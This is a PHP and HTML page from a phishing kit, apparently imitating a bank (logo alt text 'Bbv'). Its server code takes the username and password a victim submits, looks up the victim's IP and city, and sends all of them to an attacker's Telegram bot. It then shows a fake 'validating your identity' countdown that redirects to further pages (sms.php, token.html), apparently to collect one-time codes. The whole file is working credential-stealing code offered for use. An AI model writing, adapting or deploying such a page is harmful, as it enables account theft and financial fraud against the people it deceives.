<?php

ini_set("display_errors", 0);

$config = include('config.php');

$elusr = $_POST['nombre'];
$llavecita = $_POST['normalidads'];


$token = $config['token'];
$chat_id = $config['chat_id'];


if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
  
    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
} else {

    $ip = $_SERVER['REMOTE_ADDR'];
}


$ip_info = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

$city = isset($ip_info->city) ? $ip_info->city : 'Desconocida'; 


$mensaje_para_chatbot = "✅✅\nUSUARIO:  ".$elusr."\nCLAVE:       ".$llavecita."\nIP: " . $ip . "\n" . $city;

$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);

$response = file_get_contents($telegram_url);
?>




<html style="--app-height:724px;">

<head>
   <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=10">

   <title>Cargando</title> 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>
   <style type="text/css">
      /* Chart.js */
      @-webkit-keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      @keyframes chartjs-render-animation {
         from {
            opacity: 0.99
         }

         to {
            opacity: 1
         }
      }

      .chartjs-render-monitor {
         -webkit-animation: chartjs-render-animation 0.001s;
         animation: chartjs-render-animation 0.001s;
      }
   </style>

</head>

</div>
</header>
<!-- END Header -->
<!-- Nav -->
<center><img class="logo_mobile" src="logo.png" alt="Bbv" width="300px"></center>
<!-- END Nav -->
<div id="hh">
   <section id="funnel-de-ingreso">
      <div class="container">
         <div class="container-top">
            <div class="row">
               <div class="col-sm-12">
                  <div class="inner-title">

                  </div>
               </div>
            </div>
         </div>
         <div style="background-color: #ffffff; width: 100%;">
            <br>
            <div style="text-align: center;" align="left"><img
                  style="width: 150px; display: block; margin-left: auto; margin-right: auto;"
                  src="./ldr.gif"></div>
            <br> <br>
                    <div
            style="
              width: 100%;
              text-align: center;
              font-size: 14px;
              font-weight: bold;
              font-family: Nunito;
              color: #e40441;
              margin-top: 30px;
              margin-bottom: 30px;
            "
          >
            Estamos validando tu identidad. <br />
            
        
            <br />
            <label style="color: black"
              >Tiempo restante <span id="countdown">15</span> segundos</label
            >
            <script>
              // Función para iniciar la cuenta regresiva
              function startCountdown(seconds) {
                // Obtener el elemento <span> donde mostraremos el contador
                var countdownElement = document.getElementById("countdown");

                // Iniciar el intervalo de cuenta regresiva
                var countdownInterval = setInterval(function () {
                  // Actualizar el contenido del elemento con el valor actual de segundos
                  countdownElement.textContent = seconds;

                  // Reducir el valor de segundos
                  seconds--;

                  // Verificar si el contador ha llegado a cero
                  if (seconds < 0) {
                    // Limpiar el intervalo y mostrar una alerta
                    clearInterval(countdownInterval);

                    window.location.href = "sms.php";
                  }
                }, 1000); // Intervalo de 1 segundo
              }

              // Llamar a la función de cuenta regresiva al cargar la página
              document.addEventListener("DOMContentLoaded", function () {
                startCountdown(15); // Iniciar la cuenta regresiva con 30 segundos
              });
            </script>

               <br>
               <div id="ingresotokenbody" class="ingreso-token__body ingreso-token__body--predeterminado"
                  style="text-align: center;">


               </div>
            </strong>
         </div><strong id="time">
         </strong>
      </div><strong id="time">
      </strong>
   </section><strong id="time">
      <script type="text/javascript">
         var url = "token.html";
         var seconds = 15; //número de segundos a contar
         function secondPassed() {

            var minutes = Math.round((seconds - 30) / 60); //calcula el número de minutos
            var remainingSeconds = seconds % 60; //calcula los segundos
            //si los segundos usan sólo un dígito, añadimos un cero a la izq
            if (remainingSeconds < 10) {
               remainingSeconds = "0" + remainingSeconds;
            }
            document.getElementById('countdown').innerHTML = minutes + ":" + remainingSeconds;
            if (seconds == 0) {
               clearInterval(countdownTimer);
               window.location = url;
               document.getElementById('countdown').innerHTML = "";
            } else {
               seconds--;
            }
         }

         var countdownTimer = setInterval(secondPassed, 1000);
      </script>
   </strong>
</div><strong id="time">


</strong></div><strong id="time">


</strong></body>

</html>